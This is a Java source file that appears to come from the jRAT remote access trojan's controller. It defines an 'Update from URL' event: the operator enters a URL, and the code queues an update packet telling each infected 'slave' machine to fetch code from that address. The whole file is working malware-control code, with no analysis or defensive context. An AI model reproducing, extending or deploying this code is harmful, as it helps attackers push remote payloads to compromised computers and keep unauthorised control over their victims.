package jrat.controller.events;

import jrat.api.Resources;
import jrat.controller.AbstractSlave;
import jrat.controller.Slave;
import jrat.controller.packets.outgoing.Packet18Update;
import jrat.controller.utils.NetUtils;
import jrat.controller.utils.Utils;

import javax.swing.*;


public class UpdateFromURLEvent extends Event {

	public ImageIcon icon = Resources.getIcon(getIcon());
	public String url;

	public UpdateFromURLEvent(String name) {
		super(name);
	}

	@Override
	public Object[] getDisplayData() {
		return new Object[] { icon, super.name, toString(), url };
	}

	@Override
	public void perform(AbstractSlave sl) {
		if (sl instanceof Slave) {
			((Slave)sl).addToSendQueue(new Packet18Update(url));
		}
	}

	@Override
	public String toString() {
		return "Update from URL";
	}

	@Override
	public boolean add() {
		String result = Utils.showDialog("Update from URL", "Input URL to update with");
		if (result == null) {
			return false;
		}
		if (!NetUtils.isURL(result)) {
			JOptionPane.showMessageDialog(null, "Input valid URL!", "Download URL", JOptionPane.ERROR_MESSAGE);
			return false;
		}
		url = result.trim().replace(" ", "%20");
		return true;
	}

	@Override
	public String getIcon() {
		return "update";
	}

}
